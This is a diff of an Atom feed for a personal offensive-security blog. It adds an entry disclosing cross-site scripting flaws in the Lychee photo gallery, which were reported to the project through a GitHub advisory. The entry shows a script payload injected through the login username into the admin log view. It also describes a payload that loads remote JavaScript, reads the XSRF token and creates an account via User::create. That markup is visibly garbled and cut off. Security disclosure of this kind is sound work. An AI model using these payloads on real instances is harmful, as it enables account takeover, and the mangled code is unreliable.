@@ -1,5 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"/><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"/><id>https://maggick.fr/</id><updated>2022-08-22T19:00:00+02:00</updated><subtitle>Offensive security tales</subtitle><entry><title>HTB: Late</title><link href="https://maggick.fr/2022/08/htb-late.html" rel="alternate"/><published>2022-08-22T19:00:00+02:00</published><updated>2022-08-22T19:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-08-22:/2022/08/htb-late.html</id><summary type="html">&lt;p&gt;&lt;img alt="Late Card" class="align-left" src="/media/2022.08/late_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"/><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"/><id>https://maggick.fr/</id><updated>2022-10-22T14:25:00+02:00</updated><subtitle>Offensive security tales</subtitle><entry><title>Cross-Site Scripting in Lychee</title><link href="https://maggick.fr/2022/10/cross-site-scripting-in-lychee.html" rel="alternate"/><published>2022-10-22T14:25:00+02:00</published><updated>2022-10-22T14:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-10-22:/2022/10/cross-site-scripting-in-lychee.html</id><summary type="html">&lt;p&gt;&lt;img alt="XSS in Lychee" class="align-left" src="/media/2022.10/xss_album_title_1.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://lycheeorg.github.io/"&gt;Lychee&lt;/a&gt; is a self-hosted photo-management and gallery.
+I am using the &lt;a href="https://lycheeorg.github.io/"&gt;Lychee&lt;/a&gt; application for my personal usage (mostly
+sharing pictures with the family).&lt;/p&gt;
+&lt;p&gt;The application has been greatly improved since the last update of my instance.
+I fired up a &lt;a href="https://hub.docker.com/r/lycheeorg/lychee"&gt;docker&lt;/a&gt; and start taking a look at the
+application for new features.
+It was not long before I found a few XSS, one of them could allow unauthenticated users to to gain
+logged access to the platform by creating a new account.&lt;/p&gt;
+&lt;p&gt;I reported the issues to the project and we created a
+&lt;a href="https://docs.github.com/en/code-security/repository-security-advisories/about-github-security-advisories-for-repositories"&gt;Github Security Advisory&lt;/a&gt;:
+&lt;a href="https://github.com/LycheeOrg/Lychee-front/security/advisories/GHSA-cr79-38hg-27gv"&gt;https://github.com/LycheeOrg/Lychee-front/security/advisories/GHSA-cr79-38hg-27gv&lt;/a&gt;.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img alt="XSS in Lychee" class="align-left" src="/media/2022.10/xss_album_title_1.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://lycheeorg.github.io/"&gt;Lychee&lt;/a&gt; is a self-hosted photo-management and gallery.
+I am using the &lt;a href="https://lycheeorg.github.io/"&gt;Lychee&lt;/a&gt; application for my personal usage (mostly
+sharing pictures with the family).&lt;/p&gt;
+&lt;p&gt;The application has been greatly improved since the last update of my instance.
+I fired up a &lt;a href="https://hub.docker.com/r/lycheeorg/lychee"&gt;docker&lt;/a&gt; and start taking a look at the
+application for new features.
+It was not long before I found a few XSS, one of them could allow unauthenticated users to to gain
+logged access to the platform by creating a new account.&lt;/p&gt;
+&lt;p&gt;I reported the issues to the project and we created a
+&lt;a href="https://docs.github.com/en/code-security/repository-security-advisories/about-github-security-advisories-for-repositories"&gt;Github Security Advisory&lt;/a&gt;:
+&lt;a href="https://github.com/LycheeOrg/Lychee-front/security/advisories/GHSA-cr79-38hg-27gv"&gt;https://github.com/LycheeOrg/Lychee-front/security/advisories/GHSA-cr79-38hg-27gv&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The lychee application create an administrator account the first time the application is browsed.
+This account is the only one with administrative privileges (account management, logs and
+diagnostics) and is expected to have full access to the underlying server (shell access). In
+addition, this account has access to all photos and albums
+uploaded by the different users.&lt;/p&gt;
+&lt;p&gt;All this privileges made this account attractive for XSS payloads and attacks.
+Note that the session cookie was &lt;code&gt;HttpOnly&lt;/code&gt; and that the &lt;code&gt;XSRF&lt;/code&gt; cookie was not, it will matter later
+in the exploitation phase.&lt;/p&gt;
+&lt;h1&gt;Insertion points&lt;/h1&gt;
+&lt;p&gt;Only the admin can create a user account while there is a few authenticated insertions points
+(photo and album title, username once the user changed it) they are not that interesting as the
+admin probably trust the new users or even does not create user accounts.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="xss in album title" src="/media/2022.10/xss_album_title_0.png"/&gt;
+&lt;img alt="xss in album title" src="/media/2022.10/xss_album_title_1.png"/&gt;&lt;/p&gt;
+&lt;p&gt;I focused on unauthenticated insertion points.&lt;/p&gt;
+&lt;h2&gt;Logs logs logs&lt;/h2&gt;
+&lt;p&gt;The admin user has access to a "Show Logs" administrative function. I quickly noticed that
+authentication attempts where displayed in the logs including the user controlled &lt;code&gt;user&lt;/code&gt; parameter.&lt;/p&gt;
+&lt;h2&gt;Log injection - alert(1)&lt;/h2&gt;
+&lt;p&gt;It was relatively easy to try to login as the &lt;code&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/code&gt; user and trigger an alert
+in the admin session (the screenshot below is when the user change its username but the result is the
+same as we inject the logs).&lt;/p&gt;
+&lt;p&gt;&lt;img alt="unauthenticated xss in album title" src="/media/2022.10/xss_username_log.png"/&gt;&lt;/p&gt;
+&lt;p&gt;It is possible for an attacker to perform
+&lt;a href="https://owasp.org/www-community/attacks/Log_Injection"&gt;log injection&lt;/a&gt; using this entry point.&lt;/p&gt;
+&lt;h2&gt;Beyond alert(1)&lt;/h2&gt;
+&lt;p&gt;I wanted to go beyond an alert pop-up, we want a user account. Using the username
+&lt;code&gt;&lt;script 172.17.0.2:80="" api="" http:="" span="" src='172.0.0.1/a.js"/&amp;gt;&amp;lt;/code&amp;gt;, I was able to inject a longer JavaScript payload that would
+request the API endpoint &amp;lt;code&amp;gt;User::create&amp;lt;/code&amp;gt; passing in POST parameters its username, password and
+privileges. I also retrieve the &amp;lt;code&amp;gt;X-XSRF-TOKEN&amp;lt;/code&amp;gt; value from the cookie as it was not &amp;lt;code&amp;gt;HttpOnly&amp;lt;/code&amp;gt; (I
+recommended to the team to add this flag to the XSRF cookie but that
+was not possible as they also needed to access it using JavaScript.)&amp;lt;/p&amp;gt;
+&amp;lt;div class="highlight"&amp;gt;&amp;lt;pre&amp;gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span class="nx"&amp;gt;fetch&amp;lt;/span&amp;gt;&amp;lt;span class="p"&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class="s1"&amp;gt;' user::create'&lt;=""&gt;&lt;/script&gt;&lt;/code&gt;&lt;/p&gt;</content><category term="security"/><category term="security"/><category term="CVE"/><category term="XSS"/></entry><entry><title>HTB: Late</title><link href="https://maggick.fr/2022/08/htb-late.html" rel="alternate"/><published>2022-08-22T19:00:00+02:00</published><updated>2022-08-22T19:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-08-22:/2022/08/htb-late.html</id><summary type="html">&lt;p&gt;&lt;img alt="Late Card" class="align-left" src="/media/2022.08/late_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This article is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.com/home/machines/profile/463"&gt;Late&lt;/a&gt; publish on
 April 23, 2022 by
